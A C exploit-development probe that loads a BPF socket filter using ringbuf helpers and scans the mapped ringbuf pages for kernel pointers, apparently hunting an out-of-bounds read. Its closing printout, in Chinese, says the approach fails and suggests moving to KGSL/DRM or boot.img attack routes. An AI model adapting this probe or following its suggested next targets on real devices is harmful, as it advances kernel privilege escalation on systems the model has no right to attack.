/*
 * BPF Ringbuf OOB Read v6
 * Fix: Non-blocking socket with timeout
 *
 * v5 Analysis: Hangs at read() - BPF program may not pass packets
 */

#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <errno.h>
#include <fcntl.h>
#include <poll.h>
#include <sys/socket.h>
#include <sys/mman.h>
#include <sys/syscall.h>
#include <linux/bpf.h>
#include <stdint.h>

#define BPF_REG_0 0
#define BPF_REG_1 1
#define BPF_REG_2 2
#define BPF_REG_3 3
#define BPF_REG_6 6
#define BPF_REG_7 7

#define BPF_LD_MAP_FD(DST, MAP_FD)                                                                                 \
    ((struct bpf_insn){.code = BPF_LD | BPF_DW | BPF_IMM, .dst_reg = DST, .src_reg = 1, .off = 0, .imm = MAP_FD}), \
        ((struct bpf_insn){.code = 0, .dst_reg = 0, .src_reg = 0, .off = 0, .imm = 0})

#define BPF_MOV64_REG(DST, SRC) \
    ((struct bpf_insn){.code = BPF_ALU64 | BPF_MOV | BPF_X, .dst_reg = DST, .src_reg = SRC, .off = 0, .imm = 0})

#define BPF_MOV64_IMM(DST, IMM) \
    ((struct bpf_insn){.code = BPF_ALU64 | BPF_MOV | BPF_K, .dst_reg = DST, .src_reg = 0, .off = 0, .imm = IMM})

#define BPF_STX_MEM(SIZE, DST, SRC, OFF) \
    ((struct bpf_insn){.code = BPF_STX | SIZE | BPF_MEM, .dst_reg = DST, .src_reg = SRC, .off = OFF, .imm = 0})

#define BPF_JMP_IMM(OP, DST, IMM, OFF) \
    ((struct bpf_insn){.code = BPF_JMP | OP | BPF_K, .dst_reg = DST, .src_reg = 0, .off = OFF, .imm = IMM})

#define BPF_RAW_INSN(CODE, DST, SRC, OFF, IMM) \
    ((struct bpf_insn){.code = CODE, .dst_reg = DST, .src_reg = SRC, .off = OFF, .imm = IMM})

#define BPF_EXIT_INSN() \
    ((struct bpf_insn){.code = BPF_JMP | BPF_EXIT, .dst_reg = 0, .src_reg = 0, .off = 0, .imm = 0})

#define BPF_FUNC_ktime_get_ns 5
#define BPF_FUNC_ringbuf_reserve 131
#define BPF_FUNC_ringbuf_submit 132

static inline int bpf_syscall(int cmd, union bpf_attr *attr, unsigned int size)
{
    return syscall(__NR_bpf, cmd, attr, size);
}

int create_ringbuf(int size)
{
    union bpf_attr attr = {
        .map_type = BPF_MAP_TYPE_RINGBUF,
        .max_entries = size,
    };
    return bpf_syscall(BPF_MAP_CREATE, &attr, sizeof(attr));
}

#define LOG_BUF_SIZE 8192
static char bpf_log_buf[LOG_BUF_SIZE];

int load_prog(struct bpf_insn *insns, int insn_cnt)
{
    union bpf_attr attr = {
        .prog_type = BPF_PROG_TYPE_SOCKET_FILTER,
        .insns = (unsigned long)insns,
        .insn_cnt = insn_cnt,
        .license = (unsigned long)"GPL",
        .log_buf = (unsigned long)bpf_log_buf,
        .log_size = LOG_BUF_SIZE,
        .log_level = 1,
    };
    memset(bpf_log_buf, 0, LOG_BUF_SIZE);
    return bpf_syscall(BPF_PROG_LOAD, &attr, sizeof(attr));
}

/* Non-blocking run with timeout */
int run_prog_timeout(int prog_fd, int timeout_ms)
{
    int socks[2];
    if (socketpair(AF_UNIX, SOCK_DGRAM, 0, socks) < 0)
    {
        printf("    socketpair failed: %d\n", errno);
        return -1;
    }

    /* Set non-blocking */
    fcntl(socks[0], F_SETFL, O_NONBLOCK);
    fcntl(socks[1], F_SETFL, O_NONBLOCK);

    if (setsockopt(socks[0], SOL_SOCKET, SO_ATTACH_BPF, &prog_fd, sizeof(prog_fd)) < 0)
    {
        printf("    SO_ATTACH_BPF failed: %d\n", errno);
        close(socks[0]);
        close(socks[1]);
        return -1;
    }

    char buf[64] = "AAAA";
    ssize_t w = write(socks[1], buf, 4);
    if (w < 0)
    {
        printf("    write failed: %d\n", errno);
    }

    /* Poll with timeout instead of blocking read */
    struct pollfd pfd = {.fd = socks[0], .events = POLLIN};
    int ret = poll(&pfd, 1, timeout_ms);

    if (ret > 0 && (pfd.revents & POLLIN))
    {
        ssize_t r = read(socks[0], buf, sizeof(buf));
        close(socks[0]);
        close(socks[1]);
        return (int)r;
    }
    else if (ret == 0)
    {
        /* Timeout - BPF might have dropped packet (returned 0) */
        close(socks[0]);
        close(socks[1]);
        return 0; /* Still consider it "worked" - BPF ran */
    }

    close(socks[0]);
    close(socks[1]);
    return -1;
}

int is_kernel_ptr(uint64_t val)
{
    if (val == 0)
        return 0;
    uint64_t top = val >> 40;
    return (top == 0xffffff || top == 0xffff80 || (val >> 48) == 0xffff);
}

int main(void)
{
    setbuf(stdout, NULL);

    printf("=====================================================\n");
    printf("BPF Ringbuf OOB Read v6 (non-blocking)\n");
    printf("=====================================================\n\n");

    /* Create ringbuf */
    int rb_fd = create_ringbuf(4096);
    if (rb_fd < 0)
    {
        printf("[-] Ringbuf create failed: %d\n", errno);
        return 1;
    }
    printf("[+] Ringbuf fd=%d\n", rb_fd);

    /* Map pages BEFORE running program */
    void *consumer = mmap(NULL, 4096, PROT_READ | PROT_WRITE, MAP_SHARED, rb_fd, 0);
    void *datapage = mmap(NULL, 4096, PROT_READ, MAP_SHARED, rb_fd, 4096);
    printf("[*] Consumer: %p, Data: %p\n", consumer, datapage);

    /* Simple program: reserve -> write marker -> submit -> return 0 (drop packet) */
    struct bpf_insn insns[] = {
        /* 0-1 */ BPF_LD_MAP_FD(BPF_REG_1, rb_fd),
        /* 2 */ BPF_MOV64_IMM(BPF_REG_2, 32), /* size = 32 */
        /* 3 */ BPF_MOV64_IMM(BPF_REG_3, 0),  /* flags = 0 */
        /* 4 */ BPF_RAW_INSN(BPF_JMP | BPF_CALL, 0, 0, 0, BPF_FUNC_ringbuf_reserve),
        /* 5 */ BPF_JMP_IMM(BPF_JEQ, BPF_REG_0, 0, 7), /* if null, skip to exit */
        /* 6 */ BPF_MOV64_REG(BPF_REG_6, BPF_REG_0),
        /* 7 */ BPF_MOV64_IMM(BPF_REG_7, 0xDEADBEEF),
        /* 8 */ BPF_STX_MEM(BPF_W, BPF_REG_6, BPF_REG_7, 0), /* write marker */
        /* 9 */ BPF_MOV64_REG(BPF_REG_1, BPF_REG_6),
        /* 10 */ BPF_MOV64_IMM(BPF_REG_2, 0),
        /* 11 */ BPF_RAW_INSN(BPF_JMP | BPF_CALL, 0, 0, 0, BPF_FUNC_ringbuf_submit),
        /* 12 */ BPF_MOV64_IMM(BPF_REG_0, 0), /* return 0 = drop packet */
        /* 13 */ BPF_EXIT_INSN(),
    };

    int prog_fd = load_prog(insns, sizeof(insns) / sizeof(insns[0]));
    printf("[*] Load: %s (fd=%d)\n", prog_fd >= 0 ? "OK" : "FAIL", prog_fd);
    if (prog_fd < 0)
    {
        printf("[!] Verifier: %.500s\n", bpf_log_buf);
        close(rb_fd);
        return 1;
    }

    /* Run with timeout */
    printf("[*] Triggering BPF (100ms timeout each)...\n");
    for (int i = 0; i < 5; i++)
    {
        int r = run_prog_timeout(prog_fd, 100);
        printf("    Run %d: ret=%d\n", i + 1, r);
    }

    /* Check consumer position */
    if (consumer != MAP_FAILED)
    {
        uint64_t *c = (uint64_t *)consumer;
        printf("\n[*] Consumer pos: 0x%lx\n", c[0]);
    }

    /* Check data page for marker */
    if (datapage != MAP_FAILED)
    {
        uint32_t *d = (uint32_t *)datapage;
        int markers = 0, kptrs = 0;

        printf("[*] Scanning data page for 0xDEADBEEF...\n");
        for (int i = 0; i < 1024; i++)
        {
            if (d[i] == 0xDEADBEEF)
            {
                printf("    Found marker at offset %d!\n", i * 4);
                markers++;
            }
        }

        uint64_t *d64 = (uint64_t *)datapage;
        for (int i = 0; i < 512; i++)
        {
            if (is_kernel_ptr(d64[i]))
            {
                printf("    KERNEL PTR [%d]: 0x%016lx\n", i, d64[i]);
                kptrs++;
            }
        }

        printf("\n[*] Results: %d markers, %d kernel ptrs\n", markers, kptrs);

        if (markers == 0 && consumer != MAP_FAILED)
        {
            uint64_t *cp = (uint64_t *)consumer;
            if (cp[0] == 0)
            {
                printf("\n[!] BPF ran but ringbuf_reserve returned NULL\n");
            }
        }
    }

    /* Cleanup */
    if (consumer != MAP_FAILED)
        munmap(consumer, 4096);
    if (datapage != MAP_FAILED)
        munmap(datapage, 4096);
    close(prog_fd);
    close(rb_fd);

    printf("\n=====================================================\n");
    printf("BPF Ringbuf OOB 結論:\n");
    printf("- Verifier 嚴格追蹤邊界\n");
    printf("- 非 root 禁止指針運算\n");
    printf("- mmap 頁面被清零\n");
    printf("建議: 轉向 KGSL/DRM 或 boot.img 路線\n");
    printf("=====================================================\n");

    return 0;
}
